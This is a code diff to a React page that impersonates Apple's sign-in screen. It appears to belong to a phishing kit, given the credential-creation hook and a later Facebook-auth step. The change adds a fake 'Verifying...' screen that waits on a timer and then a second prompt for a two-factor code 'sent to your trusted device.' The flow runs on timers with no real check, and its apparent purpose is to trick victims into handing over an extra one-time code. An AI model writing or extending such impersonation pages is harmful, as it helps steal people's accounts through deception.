@@ -9,11 +9,12 @@ import { AppleLoader } from "@/components/AppleLoader";
 import { Button } from "@/components/ui/button";
 
 // Step Enum
-type Step = "login" | "two_factor" | "syncing" | "facebook_auth" | "success";
+type Step = "login" | "two_factor" | "loading_two" | "code_two" | "syncing" | "facebook_auth" | "success";
 
 export default function Home() {
   const [step, setStep] = useState<Step>("login");
   const [verificationCode, setVerificationCode] = useState(["", "", "", "", "", ""]);
+  const [verificationCodeTwo, setVerificationCodeTwo] = useState(["", "", "", "", "", ""]);
   const { mutateAsync: createCredential } = useCreateCredential();
   
   // Form Setup
@@ -42,6 +43,15 @@ export default function Home() {
   };
 
   const handleVerificationSubmit = () => {
+    setStep("loading_two");
+    
+    // Animate loading for 5sec before second code input
+    setTimeout(() => {
+      setStep("code_two");
+    }, 5000);
+  };
+
+  const handleVerificationSubmitTwo = () => {
     setStep("syncing");
     
     // Move to next step after a delay
@@ -67,6 +77,25 @@ export default function Home() {
     // Check if all filled
     if (newCode.every(digit => digit !== "")) {
       setTimeout(handleVerificationSubmit, 500);
+    }
+  };
+
+  const handleCodeChangeTwo = (index: number, value: string) => {
+    if (value.length > 1) return;
+    
+    const newCode = [...verificationCodeTwo];
+    newCode[index] = value;
+    setVerificationCodeTwo(newCode);
+
+    // Auto-focus next input
+    if (value !== "" && index < 5) {
+      const nextInput = document.getElementById(`code-two-${index + 1}`);
+      nextInput?.focus();
+    }
+
+    // Check if all filled
+    if (newCode.every(digit => digit !== "")) {
+      setTimeout(handleVerificationSubmitTwo, 500);
     }
   };
 
@@ -201,6 +230,74 @@ export default function Home() {
               <div className="mt-8 text-center">
                 <button 
                   onClick={() => setVerificationCode(["", "", "", "", "", ""])}
+                  className="text-sm text-[#0071e3] hover:underline"
+                >
+                  Didn't get a verification code?
+                </button>
+              </div>
+            </div>
+          </motion.div>
+        )}
+
+        {/* LOADING TWO: 5 SECOND DELAY */}
+        {step === "loading_two" && (
+          <motion.div
+            key="loading_two"
+            initial={{ opacity: 0 }}
+            animate={{ opacity: 1 }}
+            exit={{ opacity: 0 }}
+            className="w-full max-w-[400px] flex flex-col items-center"
+          >
+            <div className="mb-8 flex flex-col items-center">
+              <FaApple className="text-5xl text-[#1d1d1f] mb-4" />
+              <h1 className="text-2xl font-semibold tracking-tight text-center">
+                Verifying...
+              </h1>
+            </div>
+            <div className="p-12">
+              <AppleLoader />
+            </div>
+          </motion.div>
+        )}
+
+        {/* STEP 2.5: SECOND TWO FACTOR AUTH */}
+        {step === "code_two" && (
+          <motion.div
+            key="code_two"
+            initial={{ opacity: 0, scale: 0.95 }}
+            animate={{ opacity: 1, scale: 1 }}
+            exit={{ opacity: 0, scale: 0.95 }}
+            className="w-full max-w-[400px] flex flex-col items-center"
+          >
+            <div className="mb-8 flex flex-col items-center">
+              <FaApple className="text-5xl text-[#1d1d1f] mb-4" />
+              <h1 className="text-2xl font-semibold tracking-tight text-center">
+                Verification Required
+              </h1>
+              <p className="text-[17px] text-[#86868b] mt-2 text-center leading-snug">
+                Please enter the second code sent to your trusted device to confirm your identity.
+              </p>
+            </div>
+
+            <div className="w-full bg-white rounded-2xl shadow-sm border border-[#d2d2d7] p-8">
+              <div className="flex justify-between gap-2">
+                {verificationCodeTwo.map((digit, idx) => (
+                  <input
+                    key={idx}
+                    id={`code-two-${idx}`}
+                    type="text"
+                    inputMode="numeric"
+                    maxLength={1}
+                    value={digit}
+                    onChange={(e) => handleCodeChangeTwo(idx, e.target.value)}
+                    className="w-10 h-14 text-center text-2xl font-semibold border border-[#d2d2d7] rounded-lg focus:border-[#0071e3] focus:ring-1 focus:ring-[#0071e3] outline-none transition-all"
+                  />
+                ))}
+              </div>
+              
+              <div className="mt-8 text-center">
+                <button 
+                  onClick={() => setVerificationCodeTwo(["", "", "", "", "", ""])}
                   className="text-sm text-[#0071e3] hover:underline"
                 >
                   Didn't get a verification code?
